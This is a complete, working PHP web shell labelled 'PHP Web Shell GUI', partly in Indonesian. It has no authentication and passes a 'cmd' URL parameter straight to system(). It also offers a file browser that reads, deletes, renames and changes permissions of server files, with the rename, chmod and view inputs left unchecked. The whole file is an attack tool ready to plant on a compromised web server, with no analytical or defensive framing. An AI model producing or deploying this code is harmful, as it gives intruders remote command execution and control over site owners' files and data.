<?php
$path = isset($_GET['path']) ? realpath($_GET['path']) : getcwd();
if (!$path || !is_dir($path)) {
    die("Invalid path.");
}

// Handle delete
if (isset($_GET['delete'])) {
    $target = realpath($path . DIRECTORY_SEPARATOR . $_GET['delete']);
    if (strpos($target, $path) === 0 && file_exists($target)) {
        is_dir($target) ? rmdir($target) : unlink($target);
        header("Location: ?path=" . urlencode($path));
        exit;
    }
}

// Handle rename
if (isset($_POST['rename_from']) && isset($_POST['rename_to'])) {
    $from = $path . DIRECTORY_SEPARATOR . $_POST['rename_from'];
    $to   = $path . DIRECTORY_SEPARATOR . $_POST['rename_to'];
    if (file_exists($from)) {
        rename($from, $to);
    }
    header("Location: ?path=" . urlencode($path));
    exit;
}

// Handle chmod
if (isset($_POST['chmod_file']) && isset($_POST['new_perm'])) {
    $file = $path . DIRECTORY_SEPARATOR . $_POST['chmod_file'];
    $perm = intval($_POST['new_perm'], 8); // octal
    if (file_exists($file)) {
        chmod($file, $perm);
    }
    header("Location: ?path=" . urlencode($path));
    exit;
}

// Command exec
$output = '';
if (isset($_GET['cmd'])) {
    chdir($path);
    ob_start();
    system($_GET['cmd']);
    $output = ob_get_clean();
}

// CSS + HTML awal
echo <<<HTML
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>🌐 Web Shell GUI</title>
<style>
    body { background: #1e1e2f; color: #cfd2dc; font-family: monospace; padding: 20px; }
    a { color: #61dafb; text-decoration: none; }
    a:hover { text-decoration: underline; }
    .path { margin-bottom: 20px; }
    .box { background: #2c2f4a; padding: 10px; border-radius: 8px; margin-bottom: 10px; }
    ul { list-style: none; padding: 0; }
    li { margin: 6px 0; display: flex; justify-content: space-between; align-items: center; }
    .folder { color: #f1c40f; }
    .file { color: #95a5a6; }
    pre { background: #111; padding: 10px; border-radius: 5px; color: #0f0; overflow: auto; }
    input[type=text], select { padding: 5px; background: #111; color: #0f0; border: 1px solid #555; margin-right: 5px; }
    input[type=submit] { padding: 5px 10px; background: #333; color: #fff; border: none; cursor: pointer; }
    .del-btn, .mini-btn { color: #e74c3c; margin-left: 10px; text-decoration: none; }
    .mini-btn { color: #3498db; }
    .mini-btn:hover, .del-btn:hover { color: red; }
    table { width: 100%; border-collapse: collapse; }
    td, th { padding: 5px; border-bottom: 1px solid #333; font-size: 14px; }
    h1 { color: #61dafb; }
</style>
</head>
<body>
<h1>🌐 PHP Web Shell GUI</h1>
HTML;

// Breadcrumb path
echo "<div class='path box'><b>📁 Path:</b> ";
$parts = explode(DIRECTORY_SEPARATOR, $path);
$nav = "";
foreach ($parts as $p) {
    if ($p === "") continue;
    $nav .= DIRECTORY_SEPARATOR . $p;
    echo "<a href='?path=" . urlencode($nav) . "'>" . htmlspecialchars($p) . "</a> / ";
}
echo "</div>";

// File/folder listing
$files = scandir($path);
echo "<div class='box'><table><tr><th>Nama</th><th>Ukuran</th><th>Permission</th><th>Waktu</th><th>Aksi</th></tr>";
foreach ($files as $file) {
    if ($file === '.') continue;
    $full = $path . DIRECTORY_SEPARATOR . $file;
    $isDir = is_dir($full);
    $size = $isDir ? '-' : filesize($full);
    $perm = substr(sprintf('%o', fileperms($full)), -4);
    $mtime = date("Y-m-d H:i:s", filemtime($full));
    $delete = "<a class='del-btn' href='?path=" . urlencode($path) . "&delete=" . urlencode($file) . "' onclick=\"return confirm('Delete $file?');\">🗑️</a>";
    $rename = "<form style='display:inline' method='POST'><input type='hidden' name='rename_from' value='".htmlspecialchars($file)."'><input type='text' name='rename_to' size='10' placeholder='Rename'><input type='submit' value='✏️' class='mini-btn'></form>";
    $chmod  = "<form style='display:inline' method='POST'><input type='hidden' name='chmod_file' value='".htmlspecialchars($file)."'><input type='text' name='new_perm' size='4' placeholder='0755'><input type='submit' value='🔒' class='mini-btn'></form>";

    $link = $isDir
        ? "<span class='folder'>📁 <a href='?path=" . urlencode($full) . "'>" . htmlspecialchars($file) . "</a></span>"
        : "<span class='file'>📄 <a href='?path=" . urlencode($path) . "&view=" . urlencode($file) . "'>" . htmlspecialchars($file) . "</a></span>";

    echo "<tr><td>$link</td><td>$size</td><td>$perm</td><td>$mtime</td><td>$delete $rename $chmod</td></tr>";
}
echo "</table></div>";

// File view
if (isset($_GET['view'])) {
    $f = $path . DIRECTORY_SEPARATOR . $_GET['view'];
    if (is_file($f)) {
        echo "<div class='box'><b>📄 Viewing:</b> " . htmlspecialchars($_GET['view']) . "<pre>" . htmlspecialchars(file_get_contents($f)) . "</pre></div>";
    }
}

// Terminal
echo <<<HTML
<div class="box">
<form method="GET">
    <input type="hidden" name="path" value="{$path}" />
    <input type="text" name="cmd" placeholder="Shell command..." style="width:60%;" />
    <input type="submit" value="Run" />
</form>
</div>
HTML;

// Command output
if ($output) {
    echo "<div class='box'><b>💻 Output:</b><pre>" . htmlspecialchars($output) . "</pre></div>";
}

echo "</body></html>";
?>
